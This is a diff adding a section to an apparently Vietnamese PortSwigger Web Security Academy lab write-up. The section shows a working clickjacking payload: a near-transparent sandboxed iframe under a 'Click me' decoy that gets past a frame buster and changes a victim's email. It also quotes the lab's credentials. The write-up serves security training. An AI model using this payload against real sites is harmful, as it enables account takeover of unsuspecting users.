@@ -84,3 +84,45 @@ Dùng payload sau, prefill trước parametter email (bằng GET method trong li
 Chuyển nội dung từ `Test me` =>  `Click me` rồi Deliver To Victim => LAB SOLVED!
 
 <img width="579" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/69331c6a-49c9-4164-ad29-534592a14448">
+
+***
+
+## 3. Lab: Clickjacking with a frame buster script
+
+* Content:
+```
+This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
+
+To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
+
+You can log in to your own account using the following credentials: wiener:peter
+```
+* Exploit:
+
+Dùng payload sau: (Khác phần trước ở chỗ dùng thêm thuộc tính `sandbox="allow-forms"` trong iframe)
+
+```
+<style>
+    iframe {
+        position:relative;
+        width: 700px;
+        height: 600px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 450px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe sandbox="allow-forms" src="https://0a2d0099031ec49780ad30ec008e0031.web-security-academy.net/my-account?email=ndkhai@1.1"></iframe>
+```
+
+<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/353f2ee8-b908-428d-9a8f-6cbbe4096253">
+
+LAB SOLVED!
+
+<img width="576" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7c5249ba-2882-4164-a1d9-94bc58fba983">
